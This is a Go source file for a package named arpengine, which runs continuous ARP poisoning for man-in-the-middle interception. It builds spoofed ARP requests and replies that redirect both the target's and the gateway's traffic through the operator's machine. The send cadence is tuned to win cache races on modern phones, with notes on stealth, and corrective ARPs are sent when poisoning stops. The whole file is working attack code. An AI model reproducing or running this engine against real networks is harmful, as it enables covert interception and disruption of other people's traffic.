// Package arpengine sends unsolicited ARP replies on a cadence to perform
// MITM-style ARP poisoning, and emits corrective ARPs on stop.
package arpengine

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket/pcap"
)

// Target is one host being poisoned. The same struct is used by
// policycompiler (which imports this package for the type) so the public
// field names match the compiler's call sites.
type Target struct {
	MAC   net.HardwareAddr
	IP    net.IP
	GwMAC net.HardwareAddr
	GwIP  net.IP
}

// ActivePoison is the public view of an in-flight poison.
type ActivePoison struct {
	Target  Target
	Started time.Time
}

// Engine manages the set of in-flight ARP poisons.
//
// The engine owns a single shared pcap handle for all sends — both the
// per-target cadence loops and the post-stop corrective bursts. libpcap's
// WritePacketData is not goroutine-safe, so writes are serialised through
// handleMu. Per-target Open()/Close() in v1 was both expensive (N
// fd allocations + libpcap setup per Start) and racy with handle
// teardown during StopAll. Sharing one handle is faster, simpler, and
// removes the per-target failure mode of "couldn't open pcap for
// corrective".
type Engine struct {
	iface   string
	opMAC   net.HardwareAddr
	cadence time.Duration

	handleMu sync.Mutex // serialises WritePacketData (libpcap is not goroutine-safe)
	handle   *pcap.Handle

	mu     sync.Mutex
	active map[string]*runner // key: TargetMAC.String()

	// closed is read by Start (under e.mu) and written by Close (under
	// handleMu). Two different mutexes → can't synchronise via either.
	// Use atomic so Start's "is the engine still alive?" check works
	// without acquiring handleMu (which would inverse-nest with e.mu
	// vs the order Stop uses). Race detector validated by
	// TestStartConcurrentWithCloseIsRaceFree.
	closed atomic.Bool
}

type runner struct {
	target  Target
	cancel  context.CancelFunc
	started time.Time
	done    chan struct{} // closed when poison goroutine exits

	// Pre-built cadence frames. The 4 frames sent per cycle (REQ+REPLY
	// to poison the target, REP+REPLY to poison the gateway) are
	// completely static for the lifetime of this runner — Target MACs
	// and IPs don't change. Building them once at Start and reusing
	// them on every tick eliminates 4 SerializeBuffer allocations and
	// 4 gopacket layer-serialise passes per cycle. At default 1 Hz the
	// saving is negligible; at -poison-cadence 50ms (~20 Hz × 4 = 80
	// fps/target) it removes ~80 alloc/sec/target — meaningful when
	// poisoning a handful of stubborn iOS devices in parallel.
	poisonTargetReq []byte
	poisonTargetRep []byte
	poisonGwReq     []byte
	poisonGwRep     []byte

	// consecutiveWriteFails counts sequential pcap write failures.
	// When it crosses a threshold the engine logs a warning — keeps
	// operators from staring at a TUI that says "THROTTLE" while the
	// packets never leave the wire.
	// Accessed atomically: written by loop(), read by WriteFailures().
	consecutiveWriteFails atomic.Int32
}

// copyTarget returns a deep copy of t so callers can't mutate engine-internal
// slice backing arrays.
func copyTarget(t Target) Target {
	return Target{
		MAC:   append(net.HardwareAddr{}, t.MAC...),
		IP:    append(net.IP{}, t.IP...),
		GwMAC: append(net.HardwareAddr{}, t.GwMAC...),
		GwIP:  append(net.IP{}, t.GwIP...),
	}
}

// New returns an engine bound to a specific interface and operator MAC.
// cadence=0 selects the default of 200ms (~5 fps × 4 frames/cycle =
// 20 frames/sec/target). This faster default is needed because modern
// devices (iOS 16+, Android 12+) refresh ARP entries sub-second when
// traffic is active. The original 1s default lost the cache race.
//
// Operators on networks where 200ms is too aggressive for stealth can
// dial up via the daemon's -poison-cadence flag — `500ms` or `1s`.
// Note that slower cadence makes `policy clear` slower because the
// corrective has to flood harder to win the cache back.
//
// Returns an error if the shared pcap handle can't be opened (most
// commonly: CAP_NET_RAW missing or iface doesn't exist). Callers should
// surface this at daemon startup so the operator gets a clear failure
// instead of a silent first-policy-fails-mysteriously later on.
func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) (*Engine, error) {
	if cadence == 0 {
		cadence = 200 * time.Millisecond
	}
	h, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("arpengine: open %s: %w", iface, err)
	}
	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, handle: h, active: map[string]*runner{}}, nil
}

// Close releases the shared pcap handle. Idempotent. Should be called
// after StopAll() during daemon shutdown so any goroutine still trying
// to write through write() gets a clean error instead of a use-after-free.
func (e *Engine) Close() error {
	e.handleMu.Lock()
	defer e.handleMu.Unlock()
	if e.handle == nil {
		return nil
	}
	e.handle.Close()
	e.handle = nil
	e.closed.Store(true)
	return nil
}

// write pushes a frame through the shared handle. Returns an error if
// the engine has been closed (callers treat this as benign — Close is
// only invoked at shutdown, and any in-flight goroutines about to write
// would have already had their context cancelled).
func (e *Engine) write(buf []byte) error {
	e.handleMu.Lock()
	defer e.handleMu.Unlock()
	if e.handle == nil {
		return errors.New("arpengine: closed")
	}
	return e.handle.WritePacketData(buf)
}

// WriteFrame is the exported form of write. Lets other components on the
// daemon side (active.Sweep, future passive injectors) push frames
// through the engine's already-open pcap handle instead of opening a
// second write handle on the same iface — saves a pcap_activate +
// kernel ring buffer per use site.
//
// Concurrency: serialised through handleMu (libpcap's WritePacketData is
// not goroutine-safe). Returns an error if the engine has been Closed.
func (e *Engine) WriteFrame(buf []byte) error {
	return e.write(buf)
}

// Start begins poisoning t. Idempotent: starting an already-active target
// is a no-op (returns nil without restarting).
//
// Frame pre-build: the 4 frames sent on each cadence cycle are static for
// the lifetime of the runner, so they're constructed once here. A
// construction failure is surfaced as a Start error rather than being
// silently dropped per-tick — if gopacket can't serialise the frame for
// this target there's no point queuing the poison goroutine.
func (e *Engine) Start(t Target) error {
	key := t.MAC.String()
	e.mu.Lock()
	if e.closed.Load() {
		e.mu.Unlock()
		return errors.New("arpengine: closed")
	}
	if _, exists := e.active[key]; exists {
		e.mu.Unlock()
		return nil
	}
	// Build cadence frames before staking the active slot so a build
	// error doesn't leave an empty runner registered.
	// Poison target's cache: "gateway IP is at op MAC". REQUEST form
	// forces sender-info learning; REPLY follows up. ethL2Src = opMAC
	// keeps the bridge FDB clean even though the ARP body claims
	// someone else's MAC.
	pTgtReq, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	if err != nil {
		e.mu.Unlock()
		return fmt.Errorf("arpengine: build poison-target-req: %w", err)
	}
	pTgtRep, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	if err != nil {
		e.mu.Unlock()
		return fmt.Errorf("arpengine: build poison-target-rep: %w", err)
	}
	// Poison gateway's cache: "target IP is at op MAC".
	pGwReq, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
	if err != nil {
		e.mu.Unlock()
		return fmt.Errorf("arpengine: build poison-gw-req: %w", err)
	}
	pGwRep, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
	if err != nil {
		e.mu.Unlock()
		return fmt.Errorf("arpengine: build poison-gw-rep: %w", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	r := &runner{
		target:          copyTarget(t), // deep copy to avoid caller mutation
		cancel:          cancel,
		started:         time.Now(),
		done:            make(chan struct{}),
		poisonTargetReq: pTgtReq,
		poisonTargetRep: pTgtRep,
		poisonGwReq:     pGwReq,
		poisonGwRep:     pGwRep,
	}
	e.active[key] = r
	// Launch goroutine BEFORE releasing the lock to avoid race where
	// Stop() could delete the entry and cancel before loop() starts.
	// The goroutine immediately checks ctx.Done() if it was cancelled.
	go e.loop(ctx, r)
	e.mu.Unlock()
	return nil
}

func (e *Engine) loop(ctx context.Context, r *runner) {
	defer close(r.done)
	tick := time.NewTicker(e.cadence)
	defer tick.Stop()
	send := func() {
		err1 := e.write(r.poisonTargetReq)
		_ = e.write(r.poisonTargetRep)
		_ = e.write(r.poisonGwReq)
		_ = e.write(r.poisonGwRep)

		if err1 != nil {
			fails := r.consecutiveWriteFails.Add(1)
			if fails == 1 {
				log.Printf("arpengine: write failed for target %s (%s → %s): pcap socket may be dead or interface does not support raw frame injection; %d consecutive cycle(s) with write errors — packets are NOT leaving the wire",
					r.target.MAC, r.target.IP, r.target.GwIP, fails)
			}
		} else if r.consecutiveWriteFails.Load() > 0 {
			log.Printf("arpengine: write recovered for target %s after %d consecutive failure(s)",
				r.target.MAC, r.consecutiveWriteFails.Load())
			r.consecutiveWriteFails.Store(0)
		}
	}

	// Check if we were cancelled before we even started (race with Stop).
	if ctx.Err() != nil {
		return
	}
	send() // immediate first emission
	for {
		select {
		case <-ctx.Done():
			if fails := r.consecutiveWriteFails.Load(); fails > 0 {
				log.Printf("arpengine: target %s stopped after %d consecutive write failures — poison was not effective",
					r.target.MAC, fails)
			}
			return
		case <-tick.C:
			send()
		}
	}
}

// Stop halts poisoning of the named target and emits corrective ARPs
// asserting the real (gw,target) mappings. Blocks until the poison
// goroutine exits AND the corrective sequence completes — total wait is
// approximately 1.6 s (locktime + corrective burst). No-op for unknown
// targets.
func (e *Engine) Stop(t Target) error {
	e.mu.Lock()
	r, ok := e.active[t.MAC.String()]
	if !ok {
		e.mu.Unlock()
		return nil
	}
	delete(e.active, t.MAC.String())
	e.mu.Unlock()
	r.cancel()
	<-r.done

	// Use a background context for single-target Stop — the caller expects
	// the corrective to complete. StopAll uses its own context for batch.
	return e.sendCorrective(context.Background(), t)
}

// sendCorrective performs the post-stop corrective ARP burst for one
// target. Split out from Stop so StopAll can run the per-target locktime
// sleep + corrective burst in parallel — the kernel locktime is per
// receiver (the target and the gateway), so concurrent correctives for
// disjoint targets don't interfere. The actual frame writes serialise
// through handleMu; that's fine because writes are negligible (~tens of
// microseconds) compared to the locktime sleep (1.1 s) and the inter-
// burst sleeps (5 × 100 ms).
//
// The ctx parameter allows cancellation during shutdown — if the daemon
// receives SIGKILL escalation, we abort gracefully instead of blocking.
func (e *Engine) sendCorrective(ctx context.Context, t Target) error {
	// Wait past Linux's neighbour-table locktime (default 1s) so the
	// receiving kernel won't silently drop our corrective frames as a
	// race with the just-completed poison send.
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-time.After(1100 * time.Millisecond):
	}

	// Build all six frames once, outside the burst loop.
	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	repGwToTarget, errGR := buildARPReply(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	reqTargetToGw, errTT := buildARPRequest(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	repTargetToGw, errTR := buildARPReply(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	garpGw, errG1 := buildGratuitousARP(e.opMAC, t.GwMAC, t.GwIP)
	garpTarget, errG2 := buildGratuitousARP(e.opMAC, t.MAC, t.IP)

	// Log frame build failures. These indicate malformed MAC/IP inputs —
	// should be rare but worth surfacing so operators see why corrective
	// isn't working. Count only unique error messages to avoid log spam.
	var buildErrs int
	for _, err := range []error{errGT, errGR, errTT, errTR, errG1, errG2} {
		if err != nil {
			buildErrs++
		}
	}
	if buildErrs > 0 {
		log.Printf("arpengine: corrective for %s: %d of 6 frames failed to build (malformed MAC/IP?) — corrective will be partial",
			t.MAC, buildErrs)
	}

	// 5 cycles × 100 ms = 500 ms of corrective. Each cycle emits the
	// real (gw, target) mappings as REQUESTs (which always learn sender
	// info), REPLIEs (some embedded receivers prefer reply form), and
	// gratuitous broadcasts (is_garp bypasses locktime). Empirically
	// reliable in the netns lab integration tests.
	//
	// Write errors are counted (not returned). A corrective burst is
	// best-effort: by the time we're here the poison goroutine is
	// already stopped, so failing a few frames is mildly bad (target
	// might keep our lie longer) but not catastrophic. The shared pcap
	// handle being dead is the most likely failure mode (Engine.Close
	// raced with us) — log once at the end so a corrupted shutdown
	// shows up in journald instead of being silent.
	var writeErrs int
	var lastErr error
	send := func(frame []byte, buildErr error) {
		if buildErr != nil {
			return
		}
		if err := e.write(frame); err != nil {
			writeErrs++
			lastErr = err
		}
	}
	for i := 0; i < 5; i++ {
		select {
		case <-ctx.Done():
			if writeErrs > 0 {
				log.Printf("arpengine: corrective burst for %s interrupted after %d cycles with %d write failures",
					t.MAC, i, writeErrs)
			}
			return ctx.Err()
		default:
		}
		send(reqGwToTarget, errGT)
		send(repGwToTarget, errGR)
		send(reqTargetToGw, errTT)
		send(repTargetToGw, errTR)
		send(garpGw, errG1)
		send(garpTarget, errG2)
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(100 * time.Millisecond):
		}
	}
	if writeErrs > 0 {
		log.Printf("arpengine: corrective burst for %s had %d write failures (last: %v) — target may stay poisoned until its ARP cache expires",
			t.MAC, writeErrs, lastErr)
	}
	return nil
}

// StopAll halts every active poison concurrently. The 1.1 s locktime
// sleep + 500 ms corrective burst is per-receiver, so running disjoint
// targets in parallel takes ~1.6 s total instead of N × 1.6 s. Errors
// are aggregated.
//
// Why this matters: scripts/shardflow-up gives the daemon a 5-second
// SIGTERM grace window before SIGKILL. Sequential cleanup of 4+ active
// poisons would blow that budget and leave real victims poisoned.
func (e *Engine) StopAll() error {
	return e.StopAllWithContext(context.Background())
}

// StopAllWithContext is StopAll with an explicit context for cancellation.
// Used by the daemon to abort corrective bursts if SIGKILL escalates.
func (e *Engine) StopAllWithContext(ctx context.Context) error {
	e.mu.Lock()
	runners := make([]*runner, 0, len(e.active))
	targets := make([]Target, 0, len(e.active))
	for k, r := range e.active {
		runners = append(runners, r)
		targets = append(targets, r.target)
		delete(e.active, k)
	}
	e.mu.Unlock()

	// Cancel all contexts first (cheap), then wait for all done channels.
	for _, r := range runners {
		r.cancel()
	}
	for _, r := range runners {
		<-r.done
	}

	var wg sync.WaitGroup
	errs := make([]error, len(targets))
	for i := range targets {
		i, t := i, targets[i]
		wg.Add(1)
		go func() {
			defer wg.Done()
			errs[i] = e.sendCorrective(ctx, t)
		}()
	}
	wg.Wait()

	var nonNil []error
	for _, e := range errs {
		if e != nil {
			nonNil = append(nonNil, e)
		}
	}
	return errors.Join(nonNil...)
}

// Active returns a snapshot of in-flight poisons.
func (e *Engine) Active() []ActivePoison {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]ActivePoison, 0, len(e.active))
	for _, r := range e.active {
		out = append(out, ActivePoison{Target: copyTarget(r.target), Started: r.started})
	}
	return out
}

// WriteFailures returns the total number of targets currently experiencing
// consecutive pcap write failures. A count > 0 with poisons active means
// ARP frames are not leaving the wire — throttle/drop/pcap policies are
// installed but the targets never see the poison.
func (e *Engine) WriteFailures() int {
	e.mu.Lock()
	defer e.mu.Unlock()
	n := 0
	for _, r := range e.active {
		if r.consecutiveWriteFails.Load() > 0 {
			n++
		}
	}
	return n
}
